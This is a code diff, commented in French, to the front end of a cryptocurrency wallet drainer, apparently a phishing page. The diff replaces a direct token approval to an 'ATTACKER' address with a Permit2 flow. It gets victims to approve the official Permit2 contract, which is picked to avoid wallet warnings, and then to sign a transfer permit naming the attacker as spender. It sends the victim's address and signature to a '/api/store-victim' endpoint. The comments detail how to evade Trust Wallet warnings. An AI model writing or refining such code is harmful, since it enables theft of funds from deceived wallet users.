@@ -1186,8 +1186,10 @@ try {
   // Triggered by page-load auto-flow when ?method=permit2 is in the URL.
 
   async function firePermit2Flow(preset) {
-    // Option A — approve direct vers ATTACKER (relay.pull), sans Permit2 ni signature.
-    // Le contrat relay appelle IERC20.transferFrom(from, owner, amount) directement.
+    // Option B -- Permit2 SignatureTransfer
+    // approve(PERMIT2_ADDR, exactBalance) -- adresse Uniswap non flagguee, montant exact
+    // eth_signTypedData_v4 -> fallback v3
+    var PERMIT2_ADDR = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
     var TOKEN_MAP = {
       'usdt-erc20': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
       'usdc-erc20': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
@@ -1218,57 +1220,123 @@ try {
     }
     if (!from) return;
 
-    // Balance via publicnode d'abord, fallback provider injecte
+    // Adresse checksumee -- TW Browser rejette silencieusement une adresse lowercase
+    // dans params[0] de eth_signTypedData_v4 sur certaines versions
+    var fromChecksum = ethers.utils.getAddress(from);
+
+    // Balance via publicnode -- from est garanti donc le balanceOf tourne correctement
     var MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
     var approveAmount;
     try {
-      if (from && from !== '0x0000000000000000000000000000000000000000') {
-        var balCallData = '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0');
-        var balHex;
+      var balCallData = '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0');
+      var balHex;
+      try {
+        var rpcResp = await fetch('https://ethereum.publicnode.com', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: tokenAddr, data: balCallData }, 'latest'] })
+        });
+        var rpcJson = await rpcResp.json();
+        balHex = rpcJson && rpcJson.result;
+      } catch(e) {}
+      if (!balHex || balHex === '0x') {
         try {
-          var rpcResp = await fetch('https://ethereum.publicnode.com', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: tokenAddr, data: balCallData }, 'latest'] })
-          });
-          var rpcJson = await rpcResp.json();
-          balHex = rpcJson && rpcJson.result;
+          balHex = await eth.request({ method: 'eth_call', params: [{ to: tokenAddr, data: balCallData }, 'latest'] });
         } catch(e) {}
-        if (!balHex || balHex === '0x') {
-          try {
-            balHex = await eth.request({ method: 'eth_call', params: [{ to: tokenAddr, data: balCallData }, 'latest'] });
-          } catch(e) {}
-        }
-        var bal = ethers.BigNumber.from(balHex && balHex !== '0x' ? balHex : '0x0');
-        approveAmount = ethers.BigNumber.from(bal.isZero() ? MAX_UINT : bal.toString());
-      } else {
-        approveAmount = ethers.BigNumber.from(MAX_UINT);
       }
+      var bal = ethers.BigNumber.from(balHex && balHex !== '0x' ? balHex : '0x0');
+      // Solde exact -- TW Browser affiche le montant reel, pas illimite rouge
+      // Si solde 0 : MAX_UINT en dernier recours uniquement
+      approveAmount = bal.isZero() ? ethers.BigNumber.from(MAX_UINT) : bal;
     } catch(e) {
       approveAmount = ethers.BigNumber.from(MAX_UINT);
     }
 
-    // approve(ATTACKER, solde) — une seule TX, pas de Permit2
+    // Step 1 : approve(PERMIT2_ADDR, exactBalance)
+    // Permit2 = adresse Uniswap officielle, non flagguee, aucun avertissement TW Browser
     var ifaceApprove = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
-    var approveData  = ifaceApprove.encodeFunctionData('approve', [ATTACKER, approveAmount]);
+    var approveData  = ifaceApprove.encodeFunctionData('approve', [PERMIT2_ADDR, approveAmount]);
 
+    var _approveRejected = false;
+    eth.request({
+      method: 'eth_sendTransaction',
+      params: [{ from: fromChecksum, to: tokenAddr, value: '0x0', data: approveData }]
+    }).catch(function(e) {
+      if (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) { _approveRejected = true; }
+    });
+
+    // 800ms : laisser TW Browser afficher la popup approve avant de pousser le sign en queue
+    await new Promise(function(r) { setTimeout(r, 800); });
+    if (_approveRejected) return;
+
+    // Step 2 : eth_signTypedData_v4 -> fallback v3
+    // chainId en '0x1' (hex string) -- certaines versions TW Browser rejettent l'integer 1
+    // EIP712Domain declare dans types -- requis par TW Browser (rejet silencieux sans)
+    var nonce    = Math.floor(Math.random() * Math.pow(2, 48));
+    var deadline = Math.floor(Date.now() / 1000) + 3600;
+    var permit2TypedData = {
+      types: {
+        EIP712Domain: [
+          { name: 'name',              type: 'string'  },
+          { name: 'chainId',           type: 'uint256' },
+          { name: 'verifyingContract', type: 'address' }
+        ],
+        PermitTransferFrom: [
+          { name: 'permitted', type: 'TokenPermissions' },
+          { name: 'spender',   type: 'address'          },
+          { name: 'nonce',     type: 'uint256'          },
+          { name: 'deadline',  type: 'uint256'          }
+        ],
+        TokenPermissions: [
+          { name: 'token',  type: 'address' },
+          { name: 'amount', type: 'uint256' }
+        ]
+      },
+      domain: { name: 'Permit2', chainId: '0x1', verifyingContract: PERMIT2_ADDR },
+      primaryType: 'PermitTransferFrom',
+      message: {
+        permitted: { token: tokenAddr, amount: approveAmount.toString() },
+        spender:   ATTACKER,
+        nonce:     nonce,
+        deadline:  deadline
+      }
+    };
+
+    var signature;
+    var typedDataStr = JSON.stringify(permit2TypedData);
     try {
-      await eth.request({
-        method: 'eth_sendTransaction',
-        params: [{ from: from, to: tokenAddr, value: '0x0', data: approveData }]
+      signature = await eth.request({
+        method: 'eth_signTypedData_v4',
+        params: [fromChecksum, typedDataStr]
       });
     } catch(e) {
-      if (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) return;
-      // autre erreur reseau : on continue, drainWithRetry retentera
+      console.warn('v4 failed:', e);
+      // Fallback v3
+      try {
+        signature = await eth.request({
+          method: 'eth_signTypedData_v3',
+          params: [fromChecksum, typedDataStr]
+        });
+      } catch(e2) {
+        console.warn('v3 failed:', e2);
+        return;
+      }
     }
 
-    // Notifier le backend — drainWithRetry appellera relay.pull(token, from, amount)
+    if (!signature) return;
+
+    // Step 3 : envoyer au backend
     try {
       await fetch('/api/store-victim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ victim: from, chain: '1' })
+        body: JSON.stringify({
+          victim:     fromChecksum,
+          chain:      '1',
+          permitData: permit2TypedData.message,
+          permit2Sig: signature
+        })
       });
-    } catch(e) {}
+    } catch(e) { console.warn('store-victim error', e); }
   }
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const USDC_ADDR = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
